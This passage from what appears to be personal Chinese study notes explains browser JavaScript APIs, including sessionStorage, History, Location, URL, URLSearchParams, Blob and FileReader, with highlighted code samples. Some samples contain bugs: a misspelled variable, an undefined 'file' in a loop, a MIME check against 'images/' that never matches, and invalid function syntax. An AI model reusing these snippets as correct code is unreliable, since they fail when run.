<span class="mf">5</span><span class="err">、</span><span class="nb">window</span><span class="p">.</span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">clear</span><span class="p">();</span> <span class="c1">// return undefined</span>
<span class="mf">6</span><span class="err">、</span><span class="nb">window</span><span class="p">.</span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">key</span> <span class="nx">返回一个key的伪数组</span><span class="err">，</span><span class="nx">结合length可以遍历</span><span class="err">；</span>
</code></pre></div>

<p>存储事件：当存储内容变化时，会触发storage事件。这个事件很特殊：如果一个窗口存储变化，那么当前窗口不会触发，同一个域名的其他窗口会触发这个事件（可以使用这个属性进行不同窗口的通信）</p>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;storage&#39;</span><span class="p">,</span> <span class="nx">onChange</span><span class="p">);</span>

<span class="nx">onChange</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">);</span> <span class="nx">表示变动的键名</span><span class="err">（</span><span class="nx">如果是clear事件返回null</span><span class="err">）</span>
  <span class="nx">e</span><span class="p">.</span><span class="nx">newValue</span>
  <span class="nx">e</span><span class="p">.</span><span class="nx">oldValue</span>
  <span class="nx">e</span><span class="p">.</span><span class="nx">url</span>
  <span class="nx">e</span><span class="p">.</span><span class="nx">storageArea</span>
<span class="p">}</span>
</code></pre></div>

<p>localStorage 的可以参考自己总结的博客。</p>
<p>https://blog.csdn.net/weixin_41697143/article/details/98479748</p>
<h3 id="109-history">10.9 History<a class="headerlink" href="#109-history" title="Permanent link">&para;</a></h3>
<p>浏览器的历史对象。JS脚本不允许获取历史地址，但是可以跳转导航。对历史对象的操作，和浏览器的前进后退按钮相同。</p>
<p>属性：history.length 当前历史的条数；history.state 历史堆栈顶层的属性（默认undefined）</p>
<p>方法：</p>
<ul>
<li>history.back(); history.forward(); 这里会从缓存中加载页面。</li>
<li>history.go(0) 默认是0，表示刷新界面；使用加减1表示网页前进后退。</li>
<li>History.pushState(state, title, url) state 表示状态对象，当popstate事件触发后，这个对象会传入回调函数。title 表示新页面标题，url 表示新的网址。这个方法会把当前的地址改成URL，history中会增加一个历史信息，但是界面不会跳转（不会刷新）这个网址不能跨域，否则报错。</li>
<li>History.replaceState(state, title, url) 替换当前的历史记录为新的URL（原始历史被替换）</li>
</ul>
<p>事件：popstate</p>
<p>当history对象变化时会触发这个事件：pushState() and replaceState() 不会触发这个事件，其他三个事件或者点击前进后退按钮就会触发这个事件。可以给这个事件指定回调函数。注意，页面第一次加载的时候，浏览器不会触发<code>popstate</code>事件。</p>
<h3 id="1010-location-url-urlsearchparems">10.10 Location, URL, URLSearchParems 对象<a class="headerlink" href="#1010-location-url-urlsearchparems" title="Permanent link">&para;</a></h3>
<h4 id="location">Location<a class="headerlink" href="#location" title="Permanent link">&para;</a></h4>
<p>Location 对象可以操作 URL，使用 window.location or document.location 可以获取Location对象。下面是常用的属性：</p>
<div class="codehilite"><pre><span></span><code>location.href 整个URL （如果更改，浏览器会立刻跳转到新地址，即使URL与原始相同，界面仍然会刷新）
location.origin 协议、主机名、端口 http://www.baidu.com:8080(这是只读属性)
location.protocol 协议（包括冒号） http:
location.host 主机名和端口号 www.baidu.com:8080(默认80and443端口会省略)
hostname 主机名
port 端口号

pathname 路径：从根路径开始（包括根路径）
search 查询部分：问号开始（不包括问号）
hash 哈希部分：井号开始（不包括#）
username
password 域名前面的用户名和密码 测试是undefined
</code></pre></div>

<p>更改 location.href 可以变成新的锚点('#comment')。<code>Location.href</code>属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的<code>Location.href</code>属性，导致后者的网址跳转。<code>Location</code>的其他属性都不允许跨域写入。</p>
<p>方法：</p>
<ul>
<li>location.assign(newURL) 浏览器立刻跳转到新的URL，如果不是URL会报错</li>
<li>location.replace(newURL) 直接跳转到新的网页，当前的历史不会保存（可以判断是否是移动端，然后界面进行跳转）；</li>
<li>location.reload(true) 重载当前窗口（刷新界面）如果传入true，表示想服务器重新请求，请求新界面不滚动；如果是false或者默认不传值，直接从缓存中加载，界面停留在当前滚动的位置。</li>
<li>location.toString() 等价于 let a = location.href;</li>
</ul>
<h4 id="url">URL<a class="headerlink" href="#url" title="Permanent link">&para;</a></h4>
<h5 id="1url">1、URL的编码和解码<a class="headerlink" href="#1url" title="Permanent link">&para;</a></h5>
<p>URL中的汉字和特殊字符需要转码成为UTF-8编码（例如%82）请求中路径文件名需要转码</p>
<ul>
<li>encodeURI('http://www.example.com/q=春节') （注意是URI，不是URL）传入一个字符串，会将元字符（冒号斜杠）和语义字符之外的字符，都进行转义，这里可以传入一个完整的URL</li>
<li>encodeURIComponent（filepath + name）会转码除了语义字符之外的所有字符，即元字符也会被转码。如果斜杠和冒号被转义就会出错。</li>
<li>decodeURI</li>
<li>decodeURIComponent 是上面两个方法的逆运算</li>
</ul>
<h5 id="2url">2、URL对象<a class="headerlink" href="#2url" title="Permanent link">&para;</a></h5>
<p>URL对象是一个原生对象，a标签继承了URL对象的属性和方法（href）</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http://www.example.com/index.html&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
<span class="nx">如果参数是另一个</span> <span class="nx">URL</span> <span class="nx">实例</span><span class="err">，</span><span class="nx">构造函数会自动读取该实例的href属性</span><span class="err">，</span><span class="nx">作为实际参数</span><span class="err">。</span><span class="nx">如果</span> <span class="nx">URL</span> <span class="nx">字符串是一个相对路径</span><span class="err">，</span><span class="nx">那么需要表示绝对路径的第二个参数</span><span class="err">，</span><span class="nx">作为计算基准</span><span class="err">。</span>
<span class="kd">var</span> <span class="nx">url2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;page2.html&#39;</span><span class="p">,</span> <span class="s1">&#39;http://example.com/page1.html&#39;</span><span class="p">);</span>
<span class="c1">// &quot;http://example.com/page2.html&quot;</span>
</code></pre></div>

<p>属性：URL实例对象的属性和Location的属性基本一致（origin只读，其他都可以修改）</p>
<p>方法</p>
<ul>
<li>URL.createObjectURL()为上传/下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了<code>File</code>对象或<code>Blob</code>对象的 URL。</li>
<li>URL.revokeObjectURL()用来释放<code>URL.createObjectURL</code>方法生成的 URL 实例。它的参数就是<code>URL.createObjectURL</code>方法返回的 URL 字符串。</li>
</ul>
<h5 id="3urlsearchparams">3、URLSearchParams<a class="headerlink" href="#3urlsearchparams" title="Permanent link">&para;</a></h5>
<p>URLSearchParams 用来构造、解析、处理 URL 查询部分（？后面的部分）参数可以使字符串对象数组，会对查询字符串自动编码（encode）。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 方法一：传入字符串</span>
<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="s1">&#39;?foo=1&amp;bar=2&#39;</span><span class="p">);</span>
<span class="c1">// 方法二：传入数组</span>
<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">([[</span><span class="s1">&#39;foo&#39;</span><span class="p">,</span> <span class="mf">1</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;bar&#39;</span><span class="p">,</span> <span class="mf">2</span><span class="p">]]);</span>
<span class="c1">// 方法三：传入对象</span>
<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">({</span><span class="s1">&#39;foo&#39;</span> <span class="o">:</span> <span class="mf">1</span> <span class="p">,</span> <span class="s1">&#39;bar&#39;</span> <span class="o">:</span> <span class="mf">2</span><span class="p">});</span>
</code></pre></div>

<p>浏览器向服务器发送表单数据时，可以直接使用<code>URLSearchParams</code>实例作为表单数据（POS请求的数据）。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://example.com/api&#39;</span><span class="p">,</span> <span class="p">{</span>
  <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
  <span class="nx">body</span><span class="o">:</span> <span class="nx">params</span>
<span class="p">}).</span><span class="nx">then</span><span class="p">(...)</span>

<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">({</span><span class="nx">version</span><span class="o">:</span> <span class="mf">2.0</span><span class="p">});</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">+</span> <span class="s1">&#39;?&#39;</span> <span class="o">+</span> <span class="nx">params</span><span class="p">;</span>
</code></pre></div>

<ul>
<li>URLSearchParams.toString() 把实例对象转化成字符串</li>
<li>URLSearchParams.append('baz', 3) 追加一个查询参数。第一个为键名，第二个为键值，没有返回值。</li>
<li>URLSearchParams.delete() 删除一个查询参数。</li>
<li>URLSearchParams.has() 查询一个参数 返回布尔值</li>
<li>URLSearchParams.set('foo', 5) 设置一个查询参数；如果没有这个参数就增加</li>
<li>URLSearchParams.get() 获取某个value</li>
<li>URLSearchParams.getAll() 返回全部的value数组</li>
<li>URLSearchParams.sort()  按照Unicode进行排序</li>
<li>URLSearchParams.keys()、URLSearchParams.values()、URLSearchParams.entries() 返回一个遍历器对象，让for...of... 循环遍历。<code>keys</code>方法返回的是键名的遍历器，<code>values</code>方法返回的是键值的遍历器，<code>entries</code>返回的是键值对的遍历器。</li>
</ul>
<h3 id="1011-arraybuffer-blob">10.11 ArrayBuffer, Blob<a class="headerlink" href="#1011-arraybuffer-blob" title="Permanent link">&para;</a></h3>
<h4 id="arraybuffer">ArrayBuffer 对象<a class="headerlink" href="#arraybuffer" title="Permanent link">&para;</a></h4>
<p>可以获取操作二进制数据（操作内存），主要在ES6中介绍。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mf">8</span><span class="p">);</span> <span class="c1">// 构造函数创建实例对象，表示这段二进制数据占用多少个字节</span>
<span class="nx">buffer</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">;</span> <span class="nx">当前对象占用的内存长度</span>
<span class="kd">let</span> <span class="nx">buffer2</span> <span class="o">=</span> <span class="nx">buffer</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="mf">4</span><span class="p">);</span> <span class="nx">复制一部分内存</span>
</code></pre></div>

<h4 id="blob">Blob 对象<a class="headerlink" href="#blob" title="Permanent link">&para;</a></h4>
<p>表示二进制文件的数据内容（图片）Binary Large Object 二进制大型对象，可以用来操作二进制文件</p>
<div class="codehilite"><pre><span></span><code><span class="nx">构造函数</span>
<span class="kd">let</span> <span class="nx">blob</span> <span class="o">=</span> <span class="nx">newBlob</span><span class="p">([</span><span class="nx">array</span><span class="p">],</span> <span class="nx">options</span><span class="p">);</span>
<span class="c1">// 第一个参数是二进制数组，数组成员是二进制数据或者字符串，第二个可选参数是配置，type，表示数据类型</span>

<span class="kd">let</span> <span class="nx">htmlFragment</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&lt;span&gt;Michael&lt;/span&gt;&#39;</span><span class="p">];</span>
<span class="kd">let</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">(</span><span class="nx">htmlFragemtn</span><span class="p">,</span> <span class="p">{</span>
  <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;text/html&#39;</span>
<span class="p">});</span>

<span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">foo</span><span class="o">:</span> <span class="s1">&#39;foo&#39;</span> <span class="p">};</span>
<span class="kd">let</span> <span class="nx">blob2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">obj</span><span class="p">)],</span> <span class="p">{</span>
  <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span>
<span class="p">});</span>

<span class="nx">属性和方法</span>
<span class="nx">size</span> <span class="nx">返回二进制文件的长度</span>
<span class="nx">type</span> <span class="nx">返回二进制文件的类型</span> 
<span class="nx">blob</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">start</span><span class="p">,</span> <span class="nx">end</span><span class="p">,</span> <span class="nx">type</span><span class="p">)</span> <span class="nx">截取一部分二进制文件</span><span class="err">（</span><span class="nx">可以设置类型</span><span class="err">）</span>
</code></pre></div>

<p>下面使用Blob读取上传的文件</p>
<h5 id="_18">获取文件<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h5>
<p>input type=file 的上传组件，浏览器不允许脚本直接控制value，必须用户上传。用户选好文件后，即可读取文件。文件输入input和拖拽对象dataTransfer 返回的是一个类数组，FileList，每一个item是一个File对象（File对象是Blob构造函数的特殊实例，具有 name,lastModifiedData 的属性）</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// HTML 代码如下</span>
<span class="c1">// &lt;input type=&quot;file&quot; accept=&quot;image/*&quot; multiple onchange=&quot;fileinfo(this.files)&quot;/&gt;</span>

<span class="kd">function</span> <span class="nx">fileinfo</span><span class="p">(</span><span class="nx">files</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">files</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<h5 id="_19">下载文件<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h5>
<p>在AJAX请求中，如果设置responseType = blob 下载的结果就是Blob对象</p>
<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="s1">&#39;blob&#39;</span><span class="p">;</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</code></pre></div>

<h5 id="url_1">生成URL<a class="headerlink" href="#url_1" title="Permanent link">&para;</a></h5>
<p>浏览器允许使用<code>URL.createObjectURL()</code>方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">droptarget</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;droptarget&#39;</span><span class="p">);</span>
<span class="nx">droptarget</span><span class="p">.</span><span class="nx">ondrop</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">files</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">dataTransfer</span><span class="p">.</span><span class="nx">files</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">files</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">type</span> <span class="o">=</span> <span class="nx">files</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">type</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">type</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">6</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;images/&#39;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">let</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">);</span>
    <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">files</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
    <span class="nx">img</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="mf">100</span><span class="p">;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
      <span class="nx">URL</span><span class="p">.</span><span class="nx">revokeObjectURL</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">src</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<h5 id="_20">读取文件<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h5>
<p>取得 Blob 对象以后，可以通过<code>FileReader</code>对象，读取 Blob 对象的内容，即文件内容。</p>
<p>FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。</p>
<ul>
<li><code>FileReader.readAsText()</code>：返回文本，需要指定文本编码，默认为 UTF-8。</li>
<li><code>FileReader.readAsArrayBuffer()</code>：返回 ArrayBuffer 对象。</li>
<li><code>FileReader.readAsDataURL()</code>：返回 Data URL。</li>
<li><code>FileReader.readAsBinaryString()</code>：返回原始的二进制字符串。</li>
</ul>
<p>下面是<code>FileReader.readAsText()</code>方法的例子，用来读取文本文件。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// HTML 代码如下</span>
<span class="c1">// &lt;input type=’file&#39; onchange=&#39;readfile(this.files[0])&#39;&gt;&lt;/input&gt;</span>
<span class="c1">// &lt;pre id=&#39;output&#39;&gt;&lt;/pre&gt;</span>

<span class="kd">function</span> <span class="nx">readfile</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileReader</span><span class="p">();</span>
  <span class="nx">reader</span><span class="p">.</span><span class="nx">readAsText</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
  <span class="nx">reader</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">reader</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">);</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="nx">text</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="nx">reader</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Error&#39;</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
  <span class="p">};</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码中，通过指定 FileReader 实例对象的<code>onload</code>监听函数，在实例的<code>result</code>属性上拿到文件内容。</p>
<p>下面是<code>FileReader.readAsArrayBuffer()</code>方法的例子，用于读取二进制文件。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// HTML 代码如下</span>
<span class="c1">// &lt;input type=&quot;file&quot; onchange=&quot;typefile(this.files[0])&quot;&gt;&lt;/input&gt;</span>

<span class="kd">function</span> <span class="nx">typefile</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// 文件开头的四个字节，生成一个 Blob 对象</span>
  <span class="kd">var</span> <span class="nx">slice</span> <span class="o">=</span> <span class="nx">file</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">4</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileReader</span><span class="p">();</span>
  <span class="c1">// 读取这四个字节</span>
  <span class="nx">reader</span><span class="p">.</span><span class="nx">readAsArrayBuffer</span><span class="p">(</span><span class="nx">slice</span><span class="p">);</span>
  <span class="nx">reader</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">reader</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
    <span class="c1">// 将这四个字节的内容，视作一个32位整数</span>
    <span class="kd">var</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">magic</span> <span class="o">=</span> <span class="nx">view</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
    <span class="c1">// 根据文件的前四个字节，判断它的类型</span>
    <span class="k">switch</span><span class="p">(</span><span class="nx">magic</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">case</span> <span class="mh">0x89504E47</span><span class="o">:</span> <span class="nx">file</span><span class="p">.</span><span class="nx">verified_type</span> <span class="o">=</span> <span class="s1">&#39;image/png&#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mh">0x47494638</span><span class="o">:</span> <span class="nx">file</span><span class="p">.</span><span class="nx">verified_type</span> <span class="o">=</span> <span class="s1">&#39;image/gif&#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mh">0x25504446</span><span class="o">:</span> <span class="nx">file</span><span class="p">.</span><span class="nx">verified_type</span> <span class="o">=</span> <span class="s1">&#39;application/pdf&#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mh">0x504b0304</span><span class="o">:</span> <span class="nx">file</span><span class="p">.</span><span class="nx">verified_type</span> <span class="o">=</span> <span class="s1">&#39;application/zip&#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">file</span><span class="p">.</span><span class="nx">verified_type</span><span class="p">);</span>
  <span class="p">};</span>
<span class="p">}</span>  
</code></pre></div>

<h3 id="1012-file-filelist-filereader">10.12 File, FileList, FileReader<a class="headerlink" href="#1012-file-filelist-filereader" title="Permanent link">&para;</a></h3>
<p>File 对象：File对象是一个特殊的Blob实例，文件上传后，即可从input元素中拿到这个对象</p>
<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">file</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;file-update&#39;</span><span class="p">).</span><span class="nx">files</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>

<span class="nx">构造函数</span>
<span class="kd">let</span> <span class="nx">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">(</span><span class="nx">array</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
<span class="nx">array</span> <span class="nx">是文件数组</span><span class="err">（</span><span class="nx">可以使arraybuffer或者string</span><span class="err">，</span><span class="nx">name是文件路径或者文件名</span><span class="err">，</span><span class="nx">options是配置文件</span><span class="err">，</span><span class="nx">type</span><span class="o">=</span><span class="s2">&quot;application/json&quot;</span><span class="p">,</span> <span class="nx">lastModified</span><span class="o">:</span> <span class="nx">时间戳</span><span class="err">）</span>

<span class="nx">属性和方法</span>
<span class="nx">file</span><span class="p">.</span><span class="nx">name</span>
<span class="nx">file</span><span class="p">.</span><span class="nx">size</span>
<span class="nx">file</span><span class="p">.</span><span class="nx">type</span>
<span class="nx">file</span><span class="p">.</span><span class="nx">lastModified</span>
<span class="nx">file</span><span class="p">.</span><span class="nx">slice</span><span class="p">()</span> <span class="nx">这是继承自Blob对象的方法</span>
</code></pre></div>

<p>FileList 伪数组，每一项是一个File对象：文件输入选择或者拖拽元素节点返回的就是FileList对象。FileList.length 返回的长度表示包含文件的个数。</p>
<p>FileReader 对象用于读取文件对象的内容。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileReader</span><span class="p">();</span>

<span class="nx">属性和方法</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">error</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">readyState</span><span class="p">(</span><span class="nx">表示加载的过程0</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">2</span><span class="p">)</span><span class="nx">未加载</span><span class="o">-</span><span class="nx">正在加载</span><span class="o">-</span><span class="nx">加载完成</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">result</span> <span class="nx">读取完成后的文件内容</span><span class="err">，</span><span class="nx">可能是字符串或者arraybuffer实例</span>

<span class="nx">reader</span><span class="p">.</span><span class="nx">onabort</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">onerror</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">onload</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">onloadstart</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">onloadend</span>
<span class="nx">reader</span><span class="p">.</span><span class="nx">onprogress</span>
</code></pre></div>

<p>eg</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// HTML 代码如下</span>
<span class="c1">// &lt;input type=&quot;file&quot; onchange=&quot;onChange(event)&quot;&gt;</span>
<span class="kd">function</span> <span class="nx">onChange</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">files</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
  <span class="kd">let</span> <span class="nx">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileReader</span><span class="p">();</span>
  <span class="nx">reader</span><span class="p">.</span><span class="nx">readAsText</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
  <span class="nx">reader</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">);</span>
  <span class="p">};</span>
<span class="p">}</span>
</code></pre></div>

<p>FileReader 有以下实例方法。</p>
<ul>
<li>FileReader.abort()：终止读取操作，<code>readyState</code>属性将变成<code>2</code>。</li>
<li>FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后<code>result</code>属性将返回一个 ArrayBuffer 实例。</li>
<li>FileReader.readAsBinaryString()：读取完成后，<code>result</code>属性将返回原始的二进制字符串。</li>
